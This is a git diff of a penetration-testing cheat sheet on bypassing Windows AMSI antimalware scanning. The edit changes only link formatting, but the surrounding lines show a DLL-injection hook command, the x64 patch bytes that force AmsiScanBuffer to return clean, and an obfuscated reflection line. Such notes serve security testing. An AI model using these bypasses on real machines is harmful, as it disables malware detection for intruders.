@@ -46,9 +46,9 @@ PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]
 
 ### Hooking
 
-> [Simple Injetor](https://github.com/tomcarver16/SimpleInjector)
+> https://github.com/tomcarver16/SimpleInjector
 
-> [AmsiHook](https://github.com/tomcarver16/AmsiHook)
+> https://github.com/tomcarver16/AmsiHook
 
 ```c
 PS C:\> .\SimpleInjector.exe powershell.exe .\AMSIHook.dll
@@ -56,7 +56,7 @@ PS C:\> .\SimpleInjector.exe powershell.exe .\AMSIHook.dll
 
 ### Memory Patching
 
-> [AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass)
+> https://github.com/rasta-mouse/AmsiScanBufferBypass
 
 The patch return always `AMSI_RESULT_CLEAN` and shows the following line.
 
@@ -73,7 +73,7 @@ static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
 The tool `AMSITrigger v3` can be used to discover the strings which are making calls to the `AmsiScanBuffer`.
 
-> [AMSITrigger v3](https://github.com/RythmStick/AMSITrigger)
+> https://github.com/RythmStick/AMSITrigger
 
 ```c
 PS C:\> .\AmsiTrigger_x64.exe -i .\ASBBypass.ps1
